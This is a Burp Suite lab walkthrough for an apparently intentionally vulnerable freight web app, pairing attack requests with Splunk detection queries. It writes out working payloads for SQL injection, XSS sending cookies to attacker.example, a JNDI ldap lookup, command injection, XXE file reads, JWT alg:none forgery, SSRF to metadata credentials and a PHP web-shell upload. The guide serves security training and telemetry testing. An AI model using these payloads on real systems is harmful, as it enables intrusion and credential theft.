# Burp Suite guide — Meridian Freight Solutions target

A manual Repeater and Intruder procedure for the Meridian target. Every request
below hits a real business feature; the proof of exploitation is a `MERIDIAN{...}`
value inside recovered data.

This guide is only for the isolated target deployed in your authorized lab. Do
not aim these requests at a public or production system.

## 1. Lab layout and prerequisites

```text
Burp/VAPT workstation  --->  Windows IIS :8080  --->  Waitress :5005
                                      |
                                      +-- IIS W3C logs --> Splunk UF
                                      +-- JSON events --> Splunk UF or HEC
```

Before testing:

1. Deploy with `iis/Install-IIS-LabSite.ps1` (or `docker compose up -d`).
2. Confirm `http://IIS_LAB_IP:8080/health` returns `lab_mode: true`.
3. Confirm both the tester and Splunk can reach the server.
4. Add only the target hostname/IP and port to Burp's scope. Never add wildcard
   lab domains, production ranges, or Internet targets.
5. Create the Splunk `vapt_lab` index and configure inputs per
   [`SPLUNK_INTEGRATION_GUIDE.md`](SPLUNK_INTEGRATION_GUIDE.md).

Set a test identifier and add it to every request with **Proxy > Match and
replace**, so each event is easy to find:

```http
X-Lab-Test-ID: BURP-20260914-01
```

## 2. Configure Burp

1. Start a temporary Burp project.
2. Use Burp's built-in browser, or proxy an external browser through Burp.
3. Browse `http://IIS_LAB_IP:8080` — you should get the Meridian homepage.
4. **Target > Site map**, right-click the host, **Add to scope**.
5. Send interesting requests to Repeater with **Ctrl-R**.

## 3. Baseline

```http
GET /health HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-BASELINE-001
Connection: close
```

Expected: `{"lab_mode":true,"status":"healthy"}`.

```spl
index=vapt_lab test_id=BURP-BASELINE-001
| table _time source_ip method path status duration_ms user_agent
```

## 4. Recon and exposed files (A01, A05)

Send each to Repeater. None require authentication.

```http
GET /robots.txt HTTP/1.1
GET /internal/it-runbook.txt HTTP/1.1
GET /.env HTTP/1.1
GET /backups/ HTTP/1.1
GET /backups/meridian-db-export.sql HTTP/1.1
GET /status/diagnostics HTTP/1.1
```

Expected: the runbook, the environment file, the nightly SQL export and the
status page each disclose a `MERIDIAN{...}` value. The runbook and `.env` also
hand over credentials used later.

```spl
index=vapt_lab test_id=BURP-* event_type IN (recon_hidden_path,sensitive_file_access,directory_listing_access,debug_endpoint_access)
| table _time source_ip event_type artifact
```

## 5. A01 — Broken Access Control (IDOR)

Capture a tracking request for one of your own consignments, send it to
Repeater, and change the reference:

```http
GET /api/v1/shipments/MFS-2026-4471 HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A01-001
Connection: close
```

Expected: another customer's EUR 742,000 consignment, with the release reference
in its handling notes — no session required. Use **Intruder > Sniper** on the
numeric part of the reference with a number payload (4460–4480) and a
**Grep - Match** on `MERIDIAN{` to find it automatically.

```spl
index=vapt_lab event_type=broken_access_attempt test_id=BURP-A01-001
| table _time source_ip object_id allowed
```

## 6. A03 — Injection

### SQL injection (rate search)

```http
GET /api/v1/rates/search?q=%27%20UNION%20SELECT%20id%2Cpartner%2Capi_key%20FROM%20integration_credentials--%20 HTTP/1.1
Host: IIS_LAB_IP:8080
X-Lab-Test-ID: BURP-A03-SQL-001
Connection: close
```

Compare with `?q=Rotterdam`. Expected: the partner API keys are returned.

### Auth bypass (legacy login)

```http
POST /portal/login?legacy=1 HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
X-Lab-Test-ID: BURP-A03-SQL-002
Connection: close

{"username":"ops_console'-- ","password":"x"}
```

Expected: authenticated as `ops_console` with no valid password. The current
path (`/portal/login`, no `legacy=1`) rejects the same payload.

### Reflected XSS (site search → support agent)

```http
GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
```

Then deliver it to the simulated agent:

```http
GET /support/shared-search?q=%3Cscript%3Efetch(%22//attacker.example%22)%3C%2Fscript%3E HTTP/1.1
```

Expected: the agent's session cookie is returned base64-encoded in `captured`.

```spl
index=vapt_lab test_id=BURP-A03-* 
| table _time event_type query_input search_term suspicious source_ip
```

## 7. A04 — Insecure Design

```http
POST /services/quote HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
X-Lab-Test-ID: BURP-A04-001
Connection: close

{"weight_kg":-1200,"rate_per_kg":0.42}
```

Expected: a negative total issues a credit note carrying its authorisation
reference. Retest with a positive weight for the control case.

```spl
index=vapt_lab event_type=business_logic_abuse test_id=BURP-A04-001
| table _time source_ip weight_kg rate_per_kg total
```

## 8. A02 / A07 — Authentication and session handling

### Brute force (no lockout)

Send to Intruder, **Sniper** on the password:

```http
POST /portal/login HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
X-Lab-Test-ID: BURP-A07-001
Connection: close

{"username":"svc_edi","password":"§candidate§"}
```

Payload list: `Autumn2023`, `autumn2023`, `Password1`, `summer2024`,
`autumn2024`. Grep-Match `"authenticated":true`. Expected: no lockout;
`autumn2024` succeeds and the response carries the EDI transfer key.

### JWT alg:none

Get a token from `GET /api/v1/auth/token`, decode the header in **Decoder**,
rebuild it with `{"alg":"none"}` and `{"role":"finance"}`, drop the signature
(keep the trailing dot):

```http
GET /api/v1/reports/financial HTTP/1.1
Host: IIS_LAB_IP:8080
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJoYXJib3JsaW5lIiwicm9sZSI6ImZpbmFuY2UifQ.
X-Lab-Test-ID: BURP-A07-002
Connection: close
```

Expected: the restricted financial report.

### Forged session (weak secret)

The signing key `meridian-default-signing-key` is in `/.env`, `/internal/it-runbook.txt`
and `/instance/app-secrets.ini`. Forge with `flask-unsign` or
`tools/forge_session.py`, then in Repeater set:

```http
GET /admin HTTP/1.1
Host: IIS_LAB_IP:8080
Cookie: session=<forged>
X-Lab-Test-ID: BURP-A02-001
Connection: close
```

Expected: the administration area and the DR master code. Add the cookie to a
**Session handling rule** to reuse it across the staff-only requests below.

```spl
index=vapt_lab test_id=BURP-A0(2|7)-* event_type IN (authentication_attempt,brute_force_suspected,jwt_unsigned_accepted,forged_session_detected)
| table _time source_ip event_type username algorithm reason
```

## 9. A03 — Execution (staff session required)

With the forged staff cookie set:

```http
POST /admin/diagnostics HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/json
Cookie: session=<forged>
X-Lab-Test-ID: BURP-RCE-001
Connection: close

{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}
```

SSTI in the campaign editor:

```http
GET /admin/campaigns/preview?body=%7B%7B7*7%7D%7D HTTP/1.1
Cookie: session=<forged>
```

Then the runtime read (URL-encode the braces payload from
[`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md) finding 13).

```spl
index=vapt_lab test_id=BURP-RCE-* event_type IN (command_execution,ssti_attempt)
| table _time source_ip command_line template_input
```

## 10. A05 — XXE (supplier EDI import)

```http
POST /api/v1/edi/manifest HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: application/xml
X-Lab-Test-ID: BURP-XXE-001
Connection: close

<?xml version="1.0"?>
<!DOCTYPE m [<!ENTITY x SYSTEM "file:///app/instance/edi/partner-manifest.key">]>
<manifest><consignor>&x;</consignor></manifest>
```

Expected: the entity expands to the EDI signing key. On IIS replace `/app` with
the repository path.

## 11. A06 — Vulnerable components (JNDI)

```http
GET /api/v1/audit/event HTTP/1.1
Host: IIS_LAB_IP:8080
X-Tracking-Agent: ${jndi:ldap://attacker.example/a}
X-Lab-Test-ID: BURP-A06-001
Connection: close
```

Expected: the lookup expands (simulated) and returns the audit service token.

## 12. A10 — SSRF (link preview, staff session)

```http
GET /admin/integrations/preview?url=http%3A%2F%2Fmetadata%3A8080%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fmfs-web-instance-role HTTP/1.1
Host: IIS_LAB_IP:8080
Cookie: session=<forged>
X-Lab-Test-ID: BURP-A10-001
Connection: close
```

Expected: instance role credentials. Arbitrary external destinations return 403.

```spl
index=vapt_lab event_type=ssrf_probe test_id=BURP-A10-001
| table _time source_ip target allowed
```

## 13. A04 — Unrestricted upload

```http
POST /careers/apply HTTP/1.1
Host: IIS_LAB_IP:8080
Content-Type: multipart/form-data; boundary=----b
X-Lab-Test-ID: BURP-UP-001
Connection: close

------b
Content-Disposition: form-data; name="cv"; filename="cv.php"
Content-Type: application/octet-stream

<?php system($_GET["c"]); ?>
------b--
```

Then browse `GET /uploads/` and retrieve `hr-onboarding-pack-2026.txt`. Expected:
the store is browsable and yields another applicant's document.

## 14. Automated scanning

With Burp Professional, right-click only the scoped host and **Scan** with a
crawl/audit config that excludes denial-of-service checks; keep concurrency low.
Do not treat scanner output as confirmed — reproduce each candidate in Repeater
and keep the exact request and response.

## 15. Evidence and acceptance

For every case capture: test ID, timestamp, tester, target, and authorization;
the Burp request/response; a screenshot of the recovered `MERIDIAN{...}` value;
and the matching application and IIS events in Splunk.

```spl
index=vapt_lab test_id="BURP-*" earliest=-24h
| stats count values(path) as paths values(status) as statuses by test_id event_type
| sort test_id event_type
```

Pass criteria: every planned request has matching IIS and application telemetry,
every finding is reproducible in Repeater, and the kill-chain search (UC-21 in
[`ATTACK_SIMULATION.md`](ATTACK_SIMULATION.md)) links them to one source. A
missing event is a telemetry failure even when the behavior itself reproduces.
